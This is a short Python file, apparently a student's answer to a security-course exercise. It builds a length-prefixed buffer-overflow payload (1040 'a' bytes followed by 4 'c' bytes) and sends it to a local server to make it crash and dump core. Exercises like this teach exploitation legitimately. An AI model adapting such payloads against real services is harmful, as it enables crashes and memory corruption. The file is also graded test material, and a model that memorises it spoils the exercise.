import os
import socket
import struct



HOST = '127.0.0.1'
PORT = 8000


def network_order_uint32(value) -> bytes:
    return struct.pack('>L', value)


def get_payload_helper(message: str):
    if message[-1] != '\0':
        message = message + '\0'
    # Convert from string to bytes
    message = message.encode('latin1')
    return network_order_uint32(len(message)) + message


def get_payload() -> bytes:
    """
    This function returns the data to send over the socket to the server.

    This data should cause the server to crash and generate a core dump. Make
    sure to return a `bytes` object and not an `str` object.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    payload_str = 1040 * 'a'
    payload_str += 4 * 'c'
    payload_bytes = get_payload_helper(payload_str)
    return payload_bytes


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
